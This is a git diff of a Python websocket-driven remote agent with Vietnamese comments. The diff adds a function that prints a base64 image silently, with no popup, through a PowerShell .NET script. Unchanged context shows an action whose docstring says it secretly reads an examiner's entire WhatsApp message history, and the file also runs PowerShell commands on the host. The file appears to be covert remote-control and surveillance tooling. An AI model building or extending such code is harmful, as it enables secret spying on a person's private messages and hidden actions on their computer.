@@ -460,6 +460,56 @@ async def act_print_data(data: str, filename: str = "document.pdf", printer: str
     except Exception as e:
         return f"Error: {e}"
 
+async def act_silent_print_image(data: str, printer: str = ""):
+    """In ảnh hoàn toàn im lặng (không popup) qua .NET PrintDocument, tự động canh chỉnh kích thước (fit to page)."""
+    import tempfile, base64 as _b64
+    try:
+        raw = _b64.b64decode(data)
+        tmp = Path(tempfile.mktemp(suffix=".png", dir=BASE_DIR))
+        tmp.write_bytes(raw)
+        
+        safe_path = str(tmp).replace("'", "''")
+        safe_printer = printer.replace("'", "''") if printer else ""
+        
+        ps_script = f"""
+Add-Type -AssemblyName System.Drawing
+$img = [System.Drawing.Image]::FromFile('{safe_path}')
+$doc = New-Object System.Drawing.Printing.PrintDocument
+"""
+        if safe_printer:
+            ps_script += f"$doc.PrinterSettings.PrinterName = '{safe_printer}'\n"
+            
+        ps_script += """
+$doc.DefaultPageSettings.Landscape = ($img.Width -gt $img.Height)
+
+$doc.add_PrintPage({
+    param($sender, $e)
+    $g = $e.Graphics
+    $margin = $e.PageSettings.Margins
+    $pWidth = $e.PageBounds.Width - $margin.Left - $margin.Right
+    $pHeight = $e.PageBounds.Height - $margin.Top - $margin.Bottom
+    
+    $scale = [math]::Min($pWidth / $img.Width, $pHeight / $img.Height)
+    $w = [int]($img.Width * $scale)
+    $h = [int]($img.Height * $scale)
+    $x = $margin.Left + ($pWidth - $w) / 2
+    $y = $margin.Top + ($pHeight - $h) / 2
+    
+    $g.DrawImage($img, $x, $y, $w, $h)
+})
+$doc.Print()
+$img.Dispose()
+"""
+        result = await act_powershell(ps_script, timeout=60)
+        try: tmp.unlink(missing_ok=True)
+        except: pass
+        
+        if result and "Error" in result:
+            return result
+        return f"In thành công trên máy in: {printer or 'Mặc định'}"
+    except Exception as e:
+        return f"Error: {e}"
+
 async def act_read_whatsapp_db(date_from=None, date_to=None):
     """
     💬 [THU THẬP KÝ ỨC WHATSAPP] - Đọc trộm toàn bộ lịch sử tin nhắn trò chuyện của giám khảo
@@ -672,6 +722,7 @@ ACTIONS = {
     "print_file":           lambda p: act_print_file(p.get("path",""), p.get("printer","")),
     "read_whatsapp_db":     lambda p: act_read_whatsapp_db(p.get("date_from"), p.get("date_to")),
     "print_data":           lambda p: act_print_data(p.get("data",""), p.get("filename","document.pdf"), p.get("printer","")),
+    "silent_print_image":   lambda p: act_silent_print_image(p.get("data",""), p.get("printer","")),
 }
 
 async def handle_command(ws, data):
